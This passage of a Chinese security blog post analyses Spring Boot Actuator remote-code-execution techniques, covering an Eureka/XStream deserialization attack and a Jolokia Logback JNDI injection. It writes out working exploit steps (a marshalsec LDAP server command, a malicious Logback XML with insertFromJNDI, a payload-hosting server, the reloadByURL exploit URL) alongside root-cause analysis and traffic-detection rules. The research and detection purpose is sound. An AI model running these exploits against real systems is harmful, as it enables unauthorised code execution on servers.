+</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">61</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">eureka.client.serviceUrl.defaultZone=http://127.0.0.1/example
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后请求后台刷新环境变量并重新加载环境变量：</p>
+<p><img src="/media/image-20210819181442753.png" alt="image-20210819181442753"></p>
+<h3 id="漏洞原理-1">漏洞原理</h3>
+<p>看起来和SnakeYaml RCE差不多，还是通过设置环境变量，然后触发重新加载，后台利用Xstream加载远程恶意数据造成反序列化RCE。</p>
+<p>首先是通过POST请求 <code>/env</code> 设置环境变量： <code>eureka.client.serviceUrl.defaultZone=http://127.0.0.1/examplea</code> ，这个设置的过程和前面分析一样，是通过HTTP请求 <code>EnvironmentManagerMvcEndpoint</code> 这个端点，端点内通过 <code>EnvironmentManager#setProperty(String name, String value)</code> 来设置的：</p>
+<p><img src="/media/image-20210820094647029.png" alt="image-20210820094647029"></p>
+<p>消息发布后，会触发一些类似Rebind的事件处理器。后续这个环境变量，将自动绑定到 <code>EurekaClientConfigBean</code> 类的 <code>serviceUrl</code> 属性中。</p>
+<p>首先看到 <code>EurekaClientConfigBean</code> 类的定义，可以看到它是一个SpringBoot配置类，配置前缀是 <code>eureka.client</code> ：</p>
+<p><img src="/media/image-20210820103458899.png" alt="image-20210820103458899"></p>
+<p>我们设置的环境变量为： <code>eureka.client.serviceUrl.defaultZone=http://127.0.0.1/example</code> ，所以我们配置的环境变量会被自动绑定到 <code>EurekaClientConfigBean</code> 类对象的 <code>serviceUrl</code> 属性：</p>
+<p><img src="/media/image-20210820103741133.png" alt="image-20210820103741133"></p>
+<p>它是一个Map类型的属性，所以根据我们配置的环境变量，这个Map内将会自动绑定一个键值对，如下：</p>
+<p><img src="/media/image-20210820103841010.png" alt="image-20210820103841010"></p>
+<p>这样攻击者设置的环境变量就自动绑定到了 <code>EurekaClientConfigBean</code> 类对象的 <code>serviceUrl</code> 属性。</p>
+<p>后续再POST请求 <code>/refresh</code> 接口，后续会触发 <code>CloudEurekaClient#fetchRegistry(boolean forceFullRegistryFetch)</code> ，并且 <code>CloudEurekaClient</code> 加载了前面的 <code>EurekaClientConfigBean</code> 配置对象：</p>
+<p><img src="/media/image-20210820104750607.png" alt="image-20210820104750607"></p>
+<p><code>CloudEurekaClient</code> 会触发底层的各种 <code>XXXHttpClient</code> 进行请求，并且请求的地址就是前面加载的配置的地址，也就是攻击者设置的地址：</p>
+<p><img src="/media/image-20210820105619825.png" alt="image-20210820105619825"></p>
+<p>底层会使用XmlStream来处理请求的响应，用来反序列化一个 <code>class com.netflix.discovery.shared.Applications</code> 对象，由此造成Xstream反序列化漏洞：</p>
+<p><img src="/media/image-20210820105900265.png" alt="image-20210820105900265"></p>
+<h3 id="流量特征-1">流量特征</h3>
+<p>特征为POST请求设置环境变量，所以规则为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">METHOD = POST
+</span></span><span class="line"><span class="cl">URI    = /env
+</span></span><span class="line"><span class="cl">REG    = eureka\.client\.serviceUrl\.defaultZone=https?:\S*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="jolokia-logback-jndi-rce">Jolokia Logback JNDI RCE</h2>
+<h3 id="攻击复现-2">攻击复现</h3>
+<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。如果存在，则能进行攻击。</p>
+<p>先用marshalsec起一个恶意的Ldap服务：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#EvalClass <span class="m">8585</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再准备一个恶意的class文件：</p>
+<p><img src="/media/image-20210819164649769.png" alt="image-20210819164649769"></p>
+<p>还得准备一个example.xml文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;configuration&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;insertFromJNDI</span> <span class="na">env-entry-name=</span><span class="s">&#34;ldap://127.0.0.1:8585/EvalClass&#34;</span> <span class="na">as=</span><span class="s">&#34;appName&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/configuration&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>起一个HTTP服务（class文件和shell.yml需要在这个HTTP服务下）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后请求如下URL：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1!/example.xml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行命令成功：</p>
+<p><img src="/media/image-20210820112615825.png" alt="image-20210820112615825"></p>
+<h3 id="漏洞原理-2">漏洞原理</h3>
+<ol>
+<li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li>
+<li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li>
+<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
+<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
+<li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
+</ol>
+<h3 id="流量特征-2">流量特征</h3>
+<p>利用 Jolokia 攻击不仅仅只有上述的手法，所以流量规则最好是检测到 <code>/jolokia</code> 访问就给ban掉：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">METHOD = POST or GET
+</span></span><span class="line"><span class="cl">URI    = /jolokia
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="总结">总结</h2>
+<p>各种RCE场景分析未完待续&hellip;&hellip;</p>
+<p>太多了，基本思路都是差不多，都是通过actuator重新配置靶机的某个组件的配置，然后让靶机重新加载配置，触发JNDI、SQL执行等操作造成RCE。</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></li>
+<li><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">P1n93r</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-06-15
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/security/pebble%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Pebble安全研究</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/security/struts2%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+            <span class="next-text nav-default">Struts2历史漏洞分析</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'p1n93r';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
+  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
+      <span class="division">|</span>
+    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>P1n93r</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
